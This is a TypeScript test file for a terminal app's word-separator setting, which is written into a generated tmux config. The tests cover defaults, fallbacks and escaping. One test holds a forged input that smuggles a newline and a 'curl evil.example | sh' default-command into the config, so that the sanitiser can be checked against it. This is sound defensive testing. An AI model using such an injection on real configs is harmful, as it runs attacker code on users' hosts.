import { describe, it, expect } from 'vitest'
import {
  DEFAULT_WORD_SEPARATORS,
  resolveWordSeparators,
  tmuxWordSeparatorsLine,
} from './word-separators'

describe('DEFAULT_WORD_SEPARATORS', () => {
  // These are the whole point of issue #349. If any of them ever becomes a separator again,
  // double-clicking an identifier, a path or a package name goes back to selecting a fragment.
  it.each([
    ['hyphen', '-', 'nodeterm-abc123'],
    ['underscore', '_', 'MAX_LENGTH'],
    ['dot', '.', 'word-separators.ts'],
    ['slash', '/', 'src/shared/word-separators.ts'],
    ['at', '@', '@xterm/addon-webgl'],
    ['colon', ':', 'localhost:5173'],
    ['tilde', '~', '~/projects'],
    ['plus', '+', 'a+b'],
  ])('keeps %s inside a word so "%s" selects whole', (_name, ch) => {
    expect(DEFAULT_WORD_SEPARATORS).not.toContain(ch)
  })

  it('does separate on whitespace, brackets and quotes', () => {
    for (const ch of [' ', '\t', '(', ')', '[', ']', '{', '}', '<', '>', "'", '"', '`', '|']) {
      expect(DEFAULT_WORD_SEPARATORS).toContain(ch)
    }
  })
})

describe('resolveWordSeparators', () => {
  it('passes a reasonable custom set through unchanged', () => {
    expect(resolveWordSeparators(' ,;')).toBe(' ,;')
  })

  it('falls back rather than throwing on a non-string, so one bad setting cannot break every terminal', () => {
    for (const bad of [undefined, null, 42, {}, [], true]) {
      expect(resolveWordSeparators(bad)).toBe(DEFAULT_WORD_SEPARATORS)
    }
  })

  it('falls back on an empty string — "no separators at all" is a mistake, not a preference', () => {
    expect(resolveWordSeparators('')).toBe(DEFAULT_WORD_SEPARATORS)
  })

  it('falls back on an absurdly long value', () => {
    expect(resolveWordSeparators('x'.repeat(65))).toBe(DEFAULT_WORD_SEPARATORS)
  })

  it('allows tab, which is a legitimate separator', () => {
    expect(resolveWordSeparators(' \t')).toBe(' \t')
  })

  // The security case. This string is interpolated into a generated tmux config — for an SSH
  // project, one written onto somebody else's host — so a newline would append an
  // attacker-chosen tmux command rather than merely misconfigure selection.
  it.each([
    ['newline', ' \n'],
    ['carriage return', ' \r'],
    // Written as explicit escapes, never literal control bytes. Typing the real
    // characters here turned this file BINARY on its first write, which is exactly how a
    // control character silently becomes a space and the assertion stops asserting.
    ['NUL', ' \u0000'],
    ['escape', ' \u001b'],
    ['DEL', ' \u007f'],
    ['vertical tab', ' \u000b'],
  ])('refuses %s and falls back to the default', (_name, value) => {
    expect(resolveWordSeparators(value)).toBe(DEFAULT_WORD_SEPARATORS)
  })
})

describe('tmuxWordSeparatorsLine', () => {
  it('emits a tmux set line', () => {
    expect(tmuxWordSeparatorsLine(' ,')).toBe('set -g word-separators " ,"')
  })

  it('escapes every character tmux expands inside double quotes', () => {
    // Backslash, double quote, dollar and backtick all mean something to tmux in a quoted string.
    const line = tmuxWordSeparatorsLine('\\"$`')
    expect(line).toBe('set -g word-separators "\\\\\\"\\$\\`"')
  })

  it('writes tab as an escape rather than a raw tab, so a hand-copied conf survives', () => {
    expect(tmuxWordSeparatorsLine(' \t')).toBe('set -g word-separators " \\t"')
  })

  // Re-validation at the interpolation site, not merely at the type boundary — the value comes
  // from hand-editable JSON and the compile-time type is not a runtime guarantee.
  it('re-validates rather than trusting its caller, so a forged value cannot reach the conf', () => {
    const forged = ' "\nset -g default-command "curl evil.example | sh'
    const line = tmuxWordSeparatorsLine(forged)
    expect(line).not.toContain('\n')
    expect(line).not.toContain('default-command')
    expect(line).toBe(tmuxWordSeparatorsLine(DEFAULT_WORD_SEPARATORS))
  })

  it('produces exactly one line for any accepted value', () => {
    for (const v of [' ', ' ()[]', DEFAULT_WORD_SEPARATORS, ' \t']) {
      expect(tmuxWordSeparatorsLine(v).split('\n')).toHaveLength(1)
    }
  })
})
